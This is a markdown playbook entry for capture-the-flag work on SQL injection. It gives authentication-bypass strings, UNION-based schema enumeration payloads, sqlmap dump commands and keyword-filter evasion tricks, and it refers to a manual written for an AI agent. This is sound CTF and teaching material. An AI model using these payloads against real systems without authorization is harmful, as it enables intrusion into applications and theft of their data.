---
id: sqli-union-authbypass
category: WEB
tags: [sqli, sql-injection, union, union-based, auth-bypass, login-bypass, sqlmap, boolean-blind, order-by, information-schema]
tools: [sqlmap]
manuals: ["Manuals/sqlmap/3. Contexto para Claude.md"]
title: "SQL injection — auth bypass + UNION + sqlmap"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: [generic-recon-scanner]
---

## How to recognize this pattern

- A login, search or filter that reflects/uses your input in a query. A SQL error when you send `'`
  (`You have an error in your SQL syntax`) is immediate confirmation.
- A behavior change between `' OR '1'='1` and `' AND '1'='2` (boolean-based), or a timing difference
  with `SLEEP(5)` (time-based blind).
- The flag is usually in a table (`flag`, `secret`, `users`) — not on the filesystem.

## Method

### 1. Auth bypass (when you just need to get in)
```
user: ' OR '1'='1' --              password: anything
user: admin'--                     (comments out the rest of the query)
user: ' OR 1=1 LIMIT 1 --
```

### 2. UNION-based (extract data) — manual, fast
```sql
-- find the number of columns (increment until it stops erroring):
' ORDER BY 1--   ' ORDER BY 2--   ... ' ORDER BY N--
-- find the columns reflected on the page:
' UNION SELECT 1,2,3--
-- enumerate (MySQL):
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags'--
' UNION SELECT 1,flag,3 FROM flags--
```

### 3. sqlmap (when it's blind/tedious or to automate)
```bash
sqlmap -u 'http://target/item?id=1' --batch --dbs                     # GET
sqlmap -u 'http://target/login' --data='user=a&pass=b' --batch --dbs  # POST
sqlmap -r req.txt --batch --dump -T flags                             # request saved from Burp
sqlmap -u '...' --batch --dump -D ctf -T flags -C flag
```
See `Manuals/sqlmap/3. Contexto para Claude.md` for `--level/--risk`, `--technique`, tamper scripts.

## Gotchas

- Identify the **DBMS** before enumerating the schema: MySQL/MariaDB uses `information_schema`; SQLite
  uses `sqlite_master` (`' UNION SELECT name,sql FROM sqlite_master--`); Postgres differs in casting/quoting.
- `UNION SELECT` requires the **same number and compatible types** of columns — that's why `ORDER BY`
  comes first. Use `NULL` for columns whose type you don't know.
- If nothing reflects on the page but the behavior changes → blind (boolean/time); there sqlmap beats
  doing it by hand by a mile.
- Keyword filter (`SELECT`/space blocked): inline comments `/**/`, mixed case `SeLeCt`,
  `UNION/**/SELECT`, or `--level` + a tamper script in sqlmap.

## Cross-reference

- `Manuals/sqlmap/3. Contexto para Claude.md` — full automation.
- `generic-recon-scanner` — find the vulnerable endpoint first.
